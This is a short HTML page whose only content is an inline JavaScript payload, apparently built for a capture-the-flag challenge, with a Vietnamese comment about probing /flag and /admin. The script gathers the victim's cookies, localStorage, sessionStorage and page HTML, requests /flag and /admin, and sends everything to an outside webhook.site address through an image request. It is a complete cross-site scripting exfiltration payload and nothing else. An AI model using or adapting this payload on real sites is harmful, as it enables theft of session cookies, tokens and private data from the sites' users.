<!doctype html>
<html>
<body>
<script>
(async () => {
  let out = "";
  try {
    out += "COOKIE=" + document.cookie + "\n";
    out += "LS=" + JSON.stringify(localStorage) + "\n";
    out += "SS=" + JSON.stringify(sessionStorage) + "\n";
    out += "HTML=" + document.documentElement.outerHTML.substring(0,1500) + "\n";
    // thử gọi API /flag hoặc /admin
    try {
      let r = await fetch("/flag");
      out += "/flag => " + await r.text();
    } catch(e) {}
    try {
      let r = await fetch("/admin");
      out += "/admin => " + await r.text();
    } catch(e) {}
  } catch(e) {
    out = "ERROR:" + e;
  }
  new Image().src = "https://webhook.site/3065fcb8-910e-4718-9d4c-881b2c8257a9?d=" + encodeURIComponent(out);
})();
</script>
</body>
</html>
